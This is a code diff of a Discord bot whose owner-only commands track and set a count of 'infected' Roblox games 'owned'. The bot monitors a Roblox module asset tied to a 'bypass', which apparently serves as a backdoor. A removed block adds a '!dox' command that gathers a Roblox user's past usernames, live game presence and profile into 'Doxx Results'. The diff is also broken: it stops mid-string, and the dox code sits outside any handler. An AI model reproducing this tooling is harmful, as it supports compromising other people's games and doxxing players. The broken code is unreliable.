@@ -1,24 +1,31 @@
 const { Client, GatewayIntentBits } = require('discord.js');
-const client = new Client({ 
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.DirectMessages
+  ],
+  partials: ['CHANNEL', 'MESSAGE']  // ← makes DMs work
 });
 const fetch = require('node-fetch');
+const axios = require('axios');
 
-const OWNER_ID = "1265916874311471125";           // ← your ID
-const BYPASS_MODEL = "Final Draft";               
-const VERSION = "2025";                           
-let INFECTED_COUNT = 1;                           // ← starts at 1
+const OWNER_ID = "1265916874311471125";
+const BYPASS_MODEL = "Final Draft";
+const VERSION = "2025";
+let INFECTED_COUNT = 1;
 const MODULE_URL = "https://create.roblox.com/store/asset/81320160677034/Final-Draft?assetDelivery=raw";
 
-let moduleStatus = "🟡 Checking...";
+let moduleStatus = "Checking...";
 let lastCheck = 0;
 
 async function checkModule() {
     try {
         const res = await fetch(MODULE_URL, { method: "HEAD", timeout: 8000 });
-        moduleStatus = res.ok ? "🟢 ONLINE" : `🔴 DOWN (${res.status})`;
+        moduleStatus = res.ok ? "ONLINE" : `DOWN (${res.status})`;
     } catch (err) {
-        moduleStatus = "🔴 OFFLINE";
+        moduleStatus = "OFFLINE";
     }
     lastCheck = Date.now();
 }
@@ -31,9 +38,13 @@ client.once('ready', () => {
 });
 
 client.on('messageCreate', async message => {
+    // Fetch partial messages (DMs)
+    if (message.partial) await message.fetch().catch(() => {});
+
     if (message.author.id !== OWNER_ID) return;
     if (!message.content.startsWith('!')) return;
 
+    // ——— BYPASS COMMANDS ———
     if (message.content === '!bypass') {
         const embed = {
             title: "Bypass Control Panel",
@@ -51,15 +62,7 @@ client.on('messageCreate', async message => {
     }
 
     if (message.content === '!infected') {
-        message.reply({ 
-            embeds: [{
-                title: "Infection Stats",
-                description: `**${INFECTED_COUNT}** game currently owned`,
-                color: 0xff0000,
-                footer: { text: "Private • Only you" },
-                timestamp: new Date()
-            }]
-        });
+        message.reply({ embeds: [{ title: "Infection Stats", description: `**${INFECTED_COUNT}** game owned`, color: 0xff0000, footer: { text: "Private • Only you" } }] });
     }
 
     if (message.content.startsWith('!setcount')) {
@@ -67,63 +70,4 @@ client.on('messageCreate', async message => {
         if (!isNaN(num)) {
             INFECTED_COUNT = num;
             client.user.setActivity(`Owning ${INFECTED_COUNT} server${INFECTED_COUNT === 1 ? '' : 's'}`, { type: 3 });
-            message.reply(`Count updated → **${INFECTED_COUNT}**`);
-        }
-    }
-});
-
-client.login(process.env.TOKEN);
-
-
-
-
-
-// ————— DOXXING COMMANDS (only you) —————
-const axios = require('axios');
-
-if (message.content.startsWith('!dox')) {
-    if (message.author.id !== OWNER_ID) return;
-    const username = message.content.split(' ').slice(1).join(' ');
-    if (!username) return message.reply('Usage: `!dox <roblox username>`');
-
-    try {
-        // 1. Get user ID
-        const { data } = await axios.get(`https://api.roblox.com/users/get-by-username?username=${username}`);
-        if (data.errorMessage) return message.reply('User not found.');
-
-        const userId = data.Id;
-
-        // 2. Get basic info + join date + past names
-        const info = await axios.get(`https://users.roblox.com/v1/users/${userId}`);
-        const pastNames = await axios.get(`https://users.roblox.com/v1/users/${userId}/username-history?limit=100`);
-
-        // 3. Get current game they're in (if any)
-        let presence = 'Offline / Hidden';
-        try {
-            const pres = await axios.get(`https://presence.roblox.com/v1/presence/users`, {
-                data: { userIds: [userId] }
-            });
-            if (pres.data.userPresences[0]?.gameId) {
-                const game = await axios.get(`https://games.roblox.com/v1/games/${pres.data.userPresences[0].gameId}`);
-                presence = `[Playing](${game.data.universeRootPlaceUrl}) – ${game.data.name}`;
-            }
-        } catch (_) {}
-
-        const embed = {
-            title: `Doxx Results → ${info.data.name} (@${info.data.displayName})`,
-            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420` },
-            fields: [
-                { name: "User ID", value: userId.toString(), inline: true },
-                { name: "Created", value: `<t:${Math.floor(new Date(info.data.created).getTime()/1000)}:R>`, inline: true },
-                { name: "Past Usernames", value: pastNames.data.data.slice(0,10).map(n => n.name).join(', ') || 'None', inline: false },
-                { name: "Current Status", value: presence, inline: false },
-                { name: "Profile", value: `https://roblox.com/users/${userId}/profile`, inline: false }
-            ],
-            color: 0xff0000,
-            timestamp: new Date()
-        };
-        message.reply({ embeds: [embed] });
-    } catch (err) {
-        message.reply('Error – probably rate-limited or user hidden.');
-    }
-}
+            message.reply(`Count → **
